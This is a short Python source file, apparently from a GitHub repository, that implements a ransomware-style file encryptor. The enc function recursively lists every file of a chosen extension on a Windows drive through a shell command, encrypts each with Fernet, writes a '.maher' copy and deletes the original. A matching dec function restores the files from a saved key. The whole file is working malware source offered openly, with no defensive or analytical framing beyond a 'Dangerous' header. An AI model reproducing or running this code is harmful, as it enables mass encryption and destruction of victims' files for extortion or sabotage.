
# !!! Dangerous !!!

# https://github.com/MMErfani/
from subprocess import check_output
from cryptography.fernet import Fernet
import os

def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D"):
    if key == 1:  
        key = Fernet.generate_key()

    Encrypt = Fernet(key)

    new_file = open("key", "w")   #just for test
    new_file.write(str(key))      #just for test

    cmd = check_output(f"{drive}: dir /S /B *.{target_file_extention}", shell=True).decode().split() 
    try:
        for i in cmd:
            try:
                with open(i, "rb") as thisfile:
                    data = thisfile.read()
                    enc_data = Encrypt.encrypt(data)
                    new_file = open(i+f".{encrypted_file_extention}", "wb")
                    new_file.write(enc_data)
                    thisfile.close()
                    new_file.close()
                    os.remove(i)
                    print(i + "------------> " + "Encrypted")
            except:
                pass
    except:
        pass

def dec(encrypted_file_extention="maher", key=1, drive="D"):
    if key == 1:
        keyfile = open("key", "r")
        key = keyfile.read()
        key = b"%s" % bytes(key.split("'")[1].encode())
        print(key)


    
    Decrypt = Fernet(key)

    cmd = check_output(f"{drive}: && dir /S /B *.{encrypted_file_extention}", shell=True).decode().split()

    try:
        for i in cmd:
                try:
                    with open(i, "rb") as thisfile:
                        data = thisfile.read()
                        dec_data = Decrypt.decrypt(data)
                        new_file = open(i.replace(f".{encrypted_file_extention}", ""), "wb")
                        new_file.write(dec_data)
                        thisfile.close()
                        new_file.close()
                        os.remove(i)
                        print(i + "------------> " + "Decrypted")
                except:
                    pass
    except:
        pass


